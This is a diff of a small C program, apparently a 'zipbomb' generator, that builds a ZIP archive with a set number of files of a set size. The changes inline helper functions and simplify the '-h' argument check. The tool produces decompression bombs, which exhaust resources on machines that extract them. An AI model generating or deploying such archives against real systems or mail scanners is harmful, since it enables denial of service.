@@ -4,15 +4,6 @@ unsigned int strtoi(char *str) {
 	while (*str++) i = i * 10 + (*str - '0');
 	return i;
 }
-int strcmp(char *str1, char *str2) {
-	while (*str1++ && *str2++) if (*str1 != *str2) return 0;
-	return 1;
-}
-char len(unsigned int n) {
-	char i = 0;
-	while (n) i++, n /= 10;
-	return i;
-}
 #define S(i) (1LL << i)
 #define T(i) argc > i ? strtoi(argv[i]) : 1000
 #define U(x) x & 255, x >> 8 & 255
@@ -28,7 +19,7 @@ int f(const unsigned long *x, const unsigned long y) {
 	return output;
 }
 int main(int argc, char *argv[]) {
-	if (argc > 1 && strcmp(argv[1], "-h")) return printf("Usage: ./zipbomb   [name of output zip]   [number of files]\t  [size in kilobytes of each file]\nDefaults:\t\toutput.zip\t\t1000\t\t\t\t1000\n");
+	if (argc > 1 && argv[1][0] == '-' && argv[1][1] == 'h') return printf("Usage: ./zipbomb   [name of output zip]   [number of files]\t  [size in kilobytes of each file]\nDefaults:\t\toutput.zip\t\t1000\t\t\t\t1000\n");
 	FILE *file = fopen(argc > 1 ? argv[1] : "output.zip", "w");
 	const unsigned int A = S(32) - 1, B = T(2), C = T(3); 
 	unsigned int i, F = C * 1032 + 1;
@@ -59,7 +50,9 @@ int main(int argc, char *argv[]) {
 	for (i = 0; i < B; i++) {
 		char num[100];
 		sprintf(num, "%d", i);
-		const char size = i ? len(i) : 1;
+		char size = !i;
+		unsigned int j = i;
+		while (j) size++, j /= 10;
 		J += write("PK\1\2\x14%c"W"%c"X, Z, Z, 0, V, U(size), Z, Z, Z, Z) + write(num);
 	}
 	write("PK\5\6%c"X, Z, U(B), U(B), Y(J-K), Y(K), 0, 0);
